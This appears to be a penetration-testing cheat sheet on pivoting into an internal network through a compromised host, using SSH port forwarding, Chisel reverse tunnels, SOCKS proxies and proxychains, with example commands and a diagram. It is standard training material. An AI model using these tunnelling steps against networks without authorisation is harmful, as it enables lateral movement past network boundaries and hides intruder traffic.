# Pivoting

## Network scenario

Machine name | Public IP | Internal IP
--- | --- | ---
Attacking Machine (local)<br />Attacking User (me) | 10.10.10.2 | -
Compromised Machine (pivot)<br />Compromised User (victim) | 10.10.10.5 | 172.16.0.5 
Target Machine (target) | - | 172.16.0.10 

## SSH Port forwarding

### Common options

option | description
--- | ---
`-D` | Socks proxy (**D**ynamic port forwarding)
`-L` | Forward connection (**L**ocal port forwarding)
`-R` | Reverse connection (**R**emote port forwarding)
`-f` | Immediately background the shell
`-N` | Only establish the connection, don't execute any commands

### Socks proxy (Dynamic port forwarding)

Setup a proxy that forwards all tcp ports. Handy to be used with proxychains.
```bash
ssh -D <local-port> <victim>@<pivot-ip>
```

E.g.
```bash
ssh -D 1337 victim@10.10.10.5
```

Assuming 127.0.0.1 1337 is configured in `proxychains.conf` (see below)
```bash
proxychains <cmd>
```

### Forward connection (Local port forwarding)
```bash
ssh -L <local-port>:<target-ip>:<target-port> <victim>@<pivot-ip>
```

E.g.  
Accessing localhost:`1337` on attacking machine will access `172.16.0.10:80` (target) via `10.10.10.5`/172.16.0.5 (pivot).

```bash
ssh -L 1337:172.16.0.10:80 victim@10.10.10.5
```

### Reverse connection (Remote port forwarding)

As we will connect back from the target (network) to our own machine, we need to take some precautions to ensure our safety.

1. Generate a new ssh key pair
```bash
ssh-keygen
```

2. Add public key to `authorized_keys` with following restrictions
```bash
from="<target-ip>",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty <pub-key>
```

3. a) Check ssh server status
```bash
sudo systemctl status ssh
```

3. b) Start ssh server (if not already running)
```bash
sudo systemctl start ssh
```

4. Copy the private key over to the target  
⚠️⚠️⚠️ Normally we would never give away our private key, but that's why we're using a new throwaway key pair here! ⚠️⚠️⚠️

5. Establish connection
```bash
ssh -R <attacking-port>:<target-ip>:<target-port> <me>@<attacking-ip> -i <throwaway-priv-key-file>
```

E.g.  
Accessing localhost:`1337` will load `172.16.0.10:80` via `10.10.10.5` (172.16.0.5).
```bash
ssh -R 1337:172.16.0.10:80 me@10.10.10.2 -i throwaway-key
```

### Reverse proxy (Socks but reverse)
```bash
ssh -R 1337 me@10.10.10.2 -i throwaway-key
```

## Chisel

> A fast TCP/UDP tunnel over HTTP  
> [GitHub - jpillora/chisel](https://github.com/jpillora/chisel)  

Start server (local)  
```bash
./chisel server -p <listen-port> -reverse
```

E.g.  
```bash
./chisel server -p 9000 -reverse
```

Start port forwarding client (pivot)  
```bash
./chisel client <local-ip>:<listen-port> R:127.0.0.1:<local-port>:<target-ip>:<target-port>
```

E.g.  
```bash
./chisel client 10.10.10.2:9000 R:127.0.0.1:9001:172.16.0.10:80
```

### Ultimate setup: SOCKS proxy + reverse channels

1. SOCKS proxy to be able to foward any (tcp) port to the target (e.g for Burp Suite, nmap, etc.)  
⚠️ Chisel will actually start the SOCKS proxy on port 1080 ⚠️  
2. A "reverse channel", to be able to talk back to our attacking machine (e.g. for a reverse shell)  

```
┌────────┐                   ┌────────┐   ┌────────┐
│ local  │                   │ pivot  │   │ target │
│        │                   │        │   │        │
│  9000 ◄┼──chisel───────────┼► 9000  │   │        │
│        │                   │        │   │        │
│  1080 ─┼──SOCKS─proxy──────┼────────┼───┼► any   │
│        │                   │        │   │        │
│  9001 ◄┼──reverse─channel──┼─ 9001 ◄┼───┼─       │
│        │                   │        │   │        │
│  9002 ◄┼──reverse─channel──┼─ 9002 ◄┼───┼─       │
│        │                   │        │   │        │
│  ...  ◄┼──reverse─channel──┼─ ...  ◄┼───┼─       │
└────────┘                   └────────┘   └────────┘
```

Note: You can just duplicate the last part `<pivot-ip>:<pivot-port>:<local-ip>:<local-port>`, to add multple "reverse channels". Just use different ports for each.  

Start socks client w/ reverse channels (pivot)  
```bash
./chisel client <local-ip>:<listen-port> R:socks <pivot-ip>:<pivot-port>:<local-ip>:<local-port>
```

E.g.  
```bash
./chisel client 10.10.10.2:9000 R:socks \
172.16.0.5:9001:10.10.10.2:9001 \
172.16.0.5:9002:10.10.10.2:9002 \
[...]
```

## Verify 

```bash
netstat -tulpn
```

E.g.
```
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      50883/ssh
tcp6       0      0 ::1:1337                :::*                    LISTEN      50883/ssh
[...]
```

## proxychains

> A tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy.  
[GitHub - haad/proxychains: proxychains](https://github.com/haad/proxychains)

### Config file

Proxychains looks for configuration in the following order:  
1. Env  
2. `-f proxychains.conf`  
3. `./proxychains.conf`  
4. `~/.proxychains/proxychains.conf`  
5. `/etc/proxychains.conf`  

```
socks5 127.0.0.1 1337
```

Run command via proxychains  
```bash
proxychains <cmd>
```

## Foxy Proxy

See [Firefox extensions](/13-misc/firefox-extensions.md)
